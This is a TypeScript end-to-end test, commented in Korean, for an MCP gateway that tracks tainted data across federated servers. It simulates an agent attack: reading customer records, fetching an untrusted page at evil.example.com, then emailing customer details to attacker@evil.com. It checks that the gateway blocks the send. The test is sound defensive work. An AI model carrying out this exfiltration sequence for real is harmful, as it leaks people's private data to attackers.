/**
 * Phase 2 종단 테스트: 멀티서버 페더레이션 + 서버 경계를 넘는 오염 추적.
 *   - db 서버(query_customer_db, fetch_web_page)와 mail 서버(send_email)에 동시 연결
 *   - 도구가 'db.*' / 'mail.*' 접두사로 합쳐 노출되는지(네임스페이싱)
 *   - db 서버에서 민감+비신뢰를 쌓고 mail 서버로 유출 시도 → 차단되는지
 *     (서버별로 따로 노는 보안으론 못 잡는, 게이트웨이만의 교차-서버 추적)
 */

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

const __dirname = dirname(fileURLToPath(import.meta.url));
const PROXY_PATH = resolve(__dirname, "../src/index.ts");
const TSX_CLI = resolve(__dirname, "../../node_modules/tsx/dist/cli.mjs");
const SERVERS_CONFIG = resolve(__dirname, "../config/servers.demo.json");

async function main() {
  const client = new Client({ name: "federation-agent", version: "0.0.1" });
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [TSX_CLI, PROXY_PATH],
    env: { ...process.env, PROXY_SERVERS_CONFIG: SERVERS_CONFIG } as Record<string, string>,
  });
  await client.connect(transport);
  console.error("[federation] 프록시 연결됨 (페더레이션 모드)\n");

  // (1) tools/list — 여러 서버 도구가 접두사로 합쳐졌는지
  const { tools } = await client.listTools();
  const names = tools.map((t) => t.name).sort();
  console.error("[federation] 노출된 도구:", names.join(", "));
  const namespaced =
    names.includes("db.query_customer_db") &&
    names.includes("db.fetch_web_page") &&
    names.includes("mail.send_email");
  console.error(`[federation] 접두사 네임스페이싱: ${namespaced ? "✅" : "❌"}\n`);

  // (2) 서버 경계를 넘는 공격: db 서버에서 민감+비신뢰, mail 서버로 유출 시도
  await client.callTool({ name: "db.query_customer_db", arguments: { customerId: "12345" } });
  console.error("[federation] db.query_customer_db (db서버) — 민감 유입");
  await client.callTool({ name: "db.fetch_web_page", arguments: { url: "https://evil.example.com" } });
  console.error("[federation] db.fetch_web_page (db서버) — 비신뢰 노출\n");

  const send = await client.callTool({
    name: "mail.send_email",
    arguments: { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP hong@example.com" },
  });
  const blocked = send.isError === true || JSON.stringify(send.content).includes("정책 차단");
  console.error("[federation] mail.send_email (mail서버) 결과:", JSON.stringify(send.content));

  const pass = namespaced && blocked;
  console.error(
    `\n${pass ? "✅ PASS" : "❌ FAIL"} — 서버 경계를 넘는 오염 추적으로 유출 ${blocked ? "차단됨" : "통과(취약!)"}`
  );
  await client.close();
  process.exit(pass ? 0 : 1);
}

main().catch((err) => {
  console.error("[federation] 실패:", err);
  process.exit(1);
});
